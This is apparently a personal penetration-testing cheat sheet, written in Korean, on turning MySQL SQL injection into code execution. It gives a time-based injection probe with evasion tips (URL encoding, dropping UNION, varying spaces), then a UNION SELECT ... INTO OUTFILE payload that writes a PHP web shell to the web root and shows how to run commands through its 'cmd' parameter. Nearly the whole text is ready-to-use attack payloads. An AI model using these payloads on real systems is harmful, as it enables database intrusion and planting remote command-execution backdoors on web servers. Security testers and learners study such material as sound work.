
# 🐬 MySQL Code Execution
```sql
' UNION SELECT sleep(5);-- -
```
→ URL ENCODED로 실행해보기

→ 이미 SQL에 접속한 상태라면 UNION을 제외해보기

→ 띄워쓰기 on/off

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
→ SQL 인젝션을 통해 PHP 웹셸 생성  
→ `INTO OUTFILE`을 사용하여 지정 경로(`/var/www/html/tmp/webshell.php`)에 파일 작성  
→ 생성된 파일에 접근 후, `cmd` 파라미터를 통해 명령어 실행 가능  
→ 예: `http://target/tmp/webshell.php?cmd=id`

---
